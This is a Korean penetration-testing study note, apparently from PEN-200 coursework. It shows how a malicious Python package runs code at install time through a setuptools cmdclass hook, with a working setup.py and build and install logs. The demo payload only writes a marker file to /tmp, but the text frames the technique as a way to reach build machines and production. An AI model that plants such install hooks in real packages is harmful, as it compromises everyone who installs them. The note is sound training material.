# 26.9.3 설치 시점 명령 실행

> **Command Execution During Install** · PEN-200 §26.9.3

페이로드를 넣을 자리는 둘이고, **어느 쪽을 고르냐에 따라 코드가 도는 시점과 장소가 갈림** —

- `setup.py` — 패키지 **설치 시점**에 실행됨. 실질적으로는 빌드 머신에서 터질 확률이 높음
- `utils` 서브모듈 — 애플리케이션이 임포트하는 **런타임**에 실행됨. 프로덕션을 포함한 각 환경에서 터짐

실전이라면 그물을 넓게 치려고 둘 다 심음. 여기서는 목표가 프로덕션 코드 실행이라 두 번째가 본체이고, 첫 번째는 실행이 되는지만 시연함(빌더에서 셸을 따는 것은 별도 연습 과제).

설치 시점 실행의 근거는 setuptools 의 `cmdclass` 임 — 컴파일처럼 설치 과정이 복잡한 패키지를 위해 **설치 때 돌 커스텀 인스톨러 함수**를 지정할 수 있게 열어둔 기능임.

```
kali@kali:~/hackshort-util$ cat -n setup.py
01  from setuptools import setup, find_packages
02  from setuptools.command.install import install
03
04  class Installer(install):
05      def run(self):
06          install.run(self)
07          with open('/tmp/running_during_install', 'w') as f:
08              f.write('This code was executed when the package was installed')
09
10  setup(
11      name='hackshort-util',
12      version='1.1.4',
13      packages=find_packages(),
14      classifiers=[],
15      install_requires=[],
16      tests_require=[],
17      cmdclass={'install': Installer}
18  )
19
```

*`cmdclass` 로 커스텀 인스톨러를 걸어 설치 중 임의 코드를 실행함*

읽는 순서 —

- `cmdclass={'install': Installer}` — `install` 키가 pip 에게 «설치 때 이 클래스를 쓰라»고 지시함. 이 키가 없으면 아무 일도 안 일어남
- `Installer` 는 `setuptools.command.install` 의 `install` 을 상속하므로 그 임포트가 필요함
- `run()` 이 설치 중 호출되는 진입점이고, 첫 줄의 `install.run(self)` 가 **정상 설치를 그대로 이어감**. 여기까지는 티가 안 나게 만드는 부분이고, 그 뒤가 임의 코드 자리임
- 시연 페이로드는 `/tmp/running_during_install` 파일 생성 — 실행 도달 여부만 증명하면 되므로 이걸로 충분함

검증 절차에 함정이 하나 있음 — **기존 `dist/` 의 tar.gz 를 지우고 다시 빌드해야 함.** 남아 있으면 옛 패키지를 설치하고 실행이 안 됐다고 오판하게 됨. 증거 파일이 미리 없다는 것도 함께 확인함.

```
kali@kali:~/hackshort-util$ rm ./dist/hackshort-util-1.1.4.tar.gz
kali@kali:~/hackshort-util$ cat /tmp/running_during_install
cat: /tmp/running_during_install: No such file or directory
kali@kali:~/hackshort-util$ python3 ./setup.py sdist
...
```

```
kali@kali:~/hackshort-util$ pip install ./dist/hackshort_util-1.1.4.tar.gz
...
kali@kali:~/hackshort-util$ cat /tmp/running_during_install
This code was executed when the package was installed
```

*설치만 했는데 파일이 생성됨 — 설치 시점 명령 실행 성립*
